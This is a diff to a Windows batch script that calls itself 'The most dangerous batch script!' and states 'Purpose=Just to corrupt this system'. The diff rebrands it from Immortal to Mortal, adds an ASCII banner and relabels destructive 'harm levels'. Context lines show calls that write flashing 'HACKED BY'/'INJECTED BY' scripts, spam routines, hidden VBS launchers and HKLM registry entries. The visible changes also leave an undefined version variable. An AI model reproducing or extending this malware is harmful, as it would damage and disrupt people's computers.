@@ -2,9 +2,9 @@
 @echo off
 mode con: cols=100 lines=50
 
-set scriptDir=C:\Immortal
-set scriptName=Immortal.bat
-set scriptReg=HKEY_LOCAL_MACHINE\SOFTWARE\Immortal
+set scriptDir=C:\Users\Public\Mortal
+set scriptName=Mortal.bat
+set scriptReg=HKEY_LOCAL_MACHINE\SOFTWARE\MORTAL
 
 set hideVbs=%scriptDir%\hide.vbs
 set normalVbs=%scriptDir%\normal.vbs
@@ -12,6 +12,17 @@ set injectScript=%scriptDir%\epilepsy.bat
 set hackedScript=%scriptDir%\hacked.bat
 set spamBatch=%scriptDir%\spam.bat
 set randomBatch=%scriptDir%\letsrunsomeaps.bat
+
+:Banner
+echo  ███▄ ▄███▓ ▒█████   ██▀███  ▄▄▄█████▓ ▄▄▄       ██▓    
+echo ▓██▒▀█▀ ██▒▒██▒  ██▒▓██ ▒ ██▒▓  ██▒ ▓▒▒████▄    ▓██▒    
+echo ▓██    ▓██░▒██░  ██▒▓██ ░▄█ ▒▒ ▓██░ ▒░▒██  ▀█▄  ▒██░    
+echo ▒██    ▒██ ▒██   ██░▒██▀▀█▄  ░ ▓██▓ ░ ░██▄▄▄▄██ ▒██░    
+echo ▒██▒   ░██▒░ ████▓▒░░██▓ ▒██▒  ▒██▒ ░  ▓█   ▓██▒░██████▒
+echo ░ ▒░   ░  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░  ▒ ░░    ▒▒   ▓▒█░░ ▒░▓  ░
+echo ░  ░      ░  ░ ▒ ▒░   ░▒ ░ ▒░    ░      ▒   ▒▒ ░░ ░ ▒  ░
+echo ░      ░   ░ ░ ░ ▒    ░░   ░   ░        ░   ▒     ░ ░   
+echo        ░       ░ ░     ░                    ░  ░    ░  ░
 
 ::This is for registry
 ::It doesn't want to take strings with spaces so that's why I hardcoded
@@ -54,9 +65,9 @@ if not exist %scriptDir% (
 
 	call :CreateVbs
 
-	call :EpilepsyBomb "HACKED BY IMMORTAL.BAT", "%hackedScript%"
+	call :EpilepsyBomb "HACKED BY MORTALLL", "%hackedScript%"
 
-	call :EpilepsyBomb "INJECTED BY IMMORTAL.BAT", "%injectScript%"
+	call :EpilepsyBomb "INJECTED BY MORTALL", "%injectScript%"
 
 	call :SpamScript
 
@@ -71,12 +82,12 @@ if not exist %scriptDir% (
 )
 
 ::Global level variables
-set lvl[0]=[Level Casual]
-set lvl[1]=[Level Normal]
-set lvl[2]=[Level Annoying]
-set lvl[3]=[Level Harsh]
-set lvl[4]=[Level Cruel]
-set lvl[5]=[Level Deadly]
+set lvl[0]=[Harmless]
+set lvl[1]=[Very Little Harmful]
+set lvl[2]=[Little Harmful]
+set lvl[3]=[Harmful]
+set lvl[4]=[More Harmful]
+set lvl[5]=[Very Harmful]
 
 :Main
 @echo off
@@ -84,7 +95,7 @@ cls
 
 color 17
 
-set regKApp=HKEY_LOCAL_MACHINE\Immortal
+set regKApp=HKEY_LOCAL_MACHINE\MORTAL
 set regSColor=/v Theme
 set regVTheme=17
 
@@ -92,10 +103,10 @@ setlocal enabledelayedexpansion
 
 title %scriptName% - The most dangerous batch script!
 
-set Version=1.0 Release
+set Version=Release 1.0
 set Os=Windows 8.1 and newer
 set Purpose=Just to corrupt this system
-set Credits=Subscribe to CYBER SOLDIER :D
+set Credits=Credits to Koren + Cyber Soldier!
 set /a Stars=50
 set star=
 
@@ -107,7 +118,7 @@ for /l %%s in (0, 1, %Stars%) do (
 
 echo %star%
 echo Welcome to the most dangerous batch script!
-echo Current version: %Version%
+echo Current version: %scrVersion%
 echo Targeted Operating System: %Os%
 echo Purpose: %Purpose%
 echo %Credits%
@@ -120,13 +131,11 @@ for /l %%h in (0, 1, %Hashes%) do (
 	set "hash=!hash!#"
 )
 
+call :Banner
 echo.
-echo Here you can choose the level that you want to try.
-echo Each level is described according to its destructive ability.
-echo The least dangerous aka the safest is - [Level Casual].
-echo The most dangerous is called - [Level Deadly].
-echo.
-echo Press (A) - (G) to choose the level.
+echo --------------------------------------------Levels!--------------------------------------
+echo -------------------------------------Pick from () - ()!----------------------------------
+echo .
 echo %hash%
 
 endlocal
